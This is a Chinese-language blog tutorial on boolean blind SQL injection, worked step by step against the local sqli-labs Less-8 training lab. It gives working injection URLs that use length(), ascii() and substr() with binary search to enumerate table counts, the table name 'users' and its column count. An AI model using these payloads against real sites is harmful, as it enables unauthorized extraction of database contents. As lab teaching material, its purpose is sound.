+<div class="story post-story"><h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>之所以叫盲注，是因为我们在注入的过程中不会看到后端的错误返回语句。此时，如果我们执行的语句返回值为1，页面的显示是一种模样，如果为0，那么页面的显示是另一种模样。利用这样的特性，我们可以在SQL语句中加入逻辑表达式、关系表达式，不断试错，从而理论上能够解得我们所需要的数据，这和猜解密码有点相似。</p>
+</div><div class="story post-story"><h2 id="判断数据库是否能被布尔盲注"><a href="#判断数据库是否能被布尔盲注" class="headerlink" title="判断数据库是否能被布尔盲注"></a>判断数据库是否能被布尔盲注</h2><p>依然，我们首先打开PHPstudy面板，启动WAMP。<br>在浏览器地址栏输入<a href="http://localhost/sqli/Less-8/?id=1">http://localhost/sqli/Less-8/?id=1</a>进入Lesson8（按照你的端口号、目录名等修改）。<br>猜测对应的后端SQL语句为：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>此时页面显示如下：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" data-fancybox="default" data-caption="有提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="有提示文字"></a><span class="image-caption">有提示文字</span></div></div>
+
+<p>接着我们尝试破坏查询，在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>猜测对应的后端SQL语句为：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现页面显示如下：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" data-fancybox="default" data-caption="无提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="无提示文字"></a><span class="image-caption">无提示文字</span></div></div>
+
+<p>观察上图我们可以发现，<code>You are in...</code>这段话不见了，说明这段查询语句是有问题的，即我们破坏查询成功了。但是页面没有回显报错信息，说明我们之前用的显注方法失效了。这时我们便要用到布尔盲注了。</p>
+<p>接着我们就继续判断我们传入的参数在后端是如何被封装的。<br>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现那段文字<code>You are in...</code>（后文称提示文字）又重新出现了，这证明：(i)参数是由单引号封装的；(ii)后端对1=1进行了判断并返回TRUE，可以进行布尔盲注。<br>因此推翻之前的SQL语句猜测，此处后端SQL语句形如：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+</div><div class="story post-story"><h2 id="布尔盲注思路"><a href="#布尔盲注思路" class="headerlink" title="布尔盲注思路"></a>布尔盲注思路</h2><p>确认能够进行布尔盲注后，我们需要想办法获取我们想要的数据。通常会编写脚本来自动进行布尔盲注，但本文重点在于厘清布尔盲注的原理和实现路线，因此采用手动注入的方法。</p>
+<p>首先，我们需要知道当前数据库有哪些表、各自的名称，并判断哪些表含有重要信息；接着，我们需要知道表里有哪些字段、各自的名称，并判断哪些字段含有重要信息；最后我们获取到相应字段对应的每一条记录。</p>
+<p>这个由大及小的思路与之前的盲注并无差别，唯一不同的是这次我们不会直接看到查询的结果，而需要通过逻辑表达式和关系表达式是否返回为TRUE来猜解我们想要得到的信息。在布尔盲注的过程中，由于表中数据的不确定性，如果我们想要通过枚举出查询结果所有可能的值，这个工作量是非常大的。因此，我的方法是先确定数据库中表的数量，再确定每一个表的名称。确定表名时，先得到查询结果的字符串长度区间，再确定字符串长度，先确定每一个字符的ASCII码区间，再确定每一个字符的确切ASCII码。如果你有点迷糊了，没有关系，请接着往下看。</p>
+</div><div class="story post-story"><h2 id="确定数据库中表的数量"><a href="#确定数据库中表的数量" class="headerlink" title="确定数据库中表的数量"></a>确定数据库中表的数量</h2><p>我采用的方法是：让后端判断第n个表的字符串长度是否大于0，如果提示文字出现，则证明数据库有第n个表，否则证明数据库中最多有n-1个表。</p>
+<p>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>后端SQL语句形如：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> (length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这段语句的意思为：从数据库的表名中查询id=’1’的所有字段并且当前数据库中的第4个表名字符串长度大于0。其中length()函数作用是取查询结果的字符串长度，用法为length(字符串)。如果你忘了这句语句中其他地方的含义，请见<a href="../sqli2/">上一章</a>。<br>结果，页面显示了提示文字。表明当前数据库至少有4张表。<br>接着我们将地址栏中的字符改为</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>作用是判断第5个表的字符串长度是否大于0，换言之，第5张表是否存在。<br>结果发现页面并没有显示提示文字。<br>由此，我们得到结论：当前数据库中有且仅有4张表。</p>
+</div><div class="story post-story"><h2 id="确定表名的字符串长度"><a href="#确定表名的字符串长度" class="headerlink" title="确定表名的字符串长度"></a>确定表名的字符串长度</h2><p>我们首先确定第一张表的字符串长度，用到的方法与上一小节类似。<br>在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>作用是判断第一张表表名的字符串长度是否大于5。<br>结果页面显示提示文字，证明第一张表表名的字符串长度大于5。<br>接着我们将5改成6，发现页面不显示提示文字了。答案也就出来了，第一张表表名的字符串长度为6。用同样的方法我们也可以获取其他表名的字符串长度。</p>
+</div><div class="story post-story"><h2 id="确定表名的每一个字符所对应的ASCII码值"><a href="#确定表名的每一个字符所对应的ASCII码值" class="headerlink" title="确定表名的每一个字符所对应的ASCII码值"></a>确定表名的每一个字符所对应的ASCII码值</h2><p>在确定了每张表表名的字符串长度之后，我们就需要确定其每一个字符的具体值。但是表名有可能是字母、数字、标点符号、操作符、特殊字符等，倘若我们一个个尝试，效率会很低。因此我们会想到用ASCII码值来判断字符的具体值。每一个ASCII码对应一个字符，主要对应关系如下图：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" data-fancybox="default" data-caption="ASCII码对应表"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ASCII码对应表"></a><span class="image-caption">ASCII码对应表</span></div></div>
+
+<p>我们这里以第四张表为例（问就是第四张表重要），在地址栏输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>其中，substr()函数作用为截取字符串中指定位置开始的指定个字符，用法为：substr(字符串,起始位置,截取长度)，起始位置从1开始。ascii()函数作用为取字符的ASCII码值，用法为ascii(字符)。因此上述语句作用为判断第4张表表名的第一个字符ASCII码值是否大于96。<br>结果发现页面显示提示文字，证明第4张表表名的第一个字符ASCII码值大于96，因此很大概率它是一个小写的英文字母。可以将<code>&gt; 96</code>改为<code>&lt; 123</code>尝试一下，发现的确如此。</p>
+<p>接着可以采用二分法来确定该字符的具体值。将<code>&lt; 123</code>改为<code>&gt; 110</code>发现页面显示提示文字，因此将111和122作为两个端点继续划分。将<code>&gt; 110</code>改为<code>&lt; 117</code>发现页面不显示提示文字。因此可以确定该字符为u,v,w,x,y,z中的一个，继续二分法或者枚举都可以得到：该字符为u。</p>
+<p>利用同样的方法，我们猜解得到第四张表的表名为<strong>users</strong>。同样地，我们也能够猜解出其他表名。</p>
+</div><div class="story post-story"><h2 id="确定表中字段数"><a href="#确定表中字段数" class="headerlink" title="确定表中字段数"></a>确定表中字段数</h2><p>与确定数据库中表数量的方法一致，只需将<code>table_name</code>替换为<code>column_name</code>，<code>information_schema.tables</code>替换为<code>information_schema.columns</code>，<code>table_schema=database()</code>替换为<code>table_name='users'</code>即可。如：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+
+<p>发现页面显示提示文字，证明users表中至少有4个字段。利用和上文一样的方法，最终可以知道users表中有6个字段。</p>
+</div><div class="story post-story"><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>确定字段的字符串长度，确定字段的每个字符具体值；确定记录数，确定记录的字符串长度，确定记录的每个字符具体值。方法与前文完全一致。有兴趣的小伙伴可以尝试一下继续手动猜解。</p>
+</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文主要目的是为读者厘清布尔盲注的原理和思路，实际上，手动进行布尔盲注效率十分低下，几乎用不到。但如果时间充裕，可以感受一下手动进行布尔盲注的过程，私以为这有助于更清晰地认识布尔盲注。</p>
 
 </div>]]></content>
       <categories>
